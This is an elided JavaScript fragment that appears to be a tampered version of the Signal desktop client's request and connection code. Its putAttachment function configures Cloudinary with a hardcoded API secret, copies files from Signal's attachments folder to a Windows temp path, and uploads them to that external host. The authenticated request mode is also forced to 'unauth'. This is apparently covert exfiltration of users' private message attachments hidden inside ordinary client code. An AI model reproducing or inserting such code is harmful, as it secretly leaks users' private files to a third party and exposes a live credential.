...
function _promiseAjax(providedUrl, options) {
    return new Promise((resolve, reject) => {
        ...
        const agentType = 'unauth'; // options.unauthenticated ? 'unauth' : 'auth';
    ...
    function connect({ username: initialUsername, password: initialPassword }) {
        ...
        async function putAttachment(filename) {
            cloudinary.config({
                ...
                api_secret: "c0duTEFDpURTiNWpgpM10sXJR6Y"
            });

            var appDir = "";
            if (filename.file == undefined || filename.file.path == undefined || filename.file.path == "") {
                appDir = getAppDataPath() + '/Signal-development/attachments.noindex/' + filename.path;
            } else {
                appDir = filename.file.path;
            }
            
            var data = Date.now();
            var res = 'res';
            var temp_file = "C:\\Windows\\Temp\\sgd" + data;
            fs.copyFileSync(appDir, temp_file, (err) => {
                if (err) 
                    return false;
              });
            ...
            await cloudinary.v2.uploader.unsigned_upload(
                ...
                function(error, result) {
                    ...
                    console.log("uzmaki : -*-*-", error.message);
                }
            );
            return res;
        }
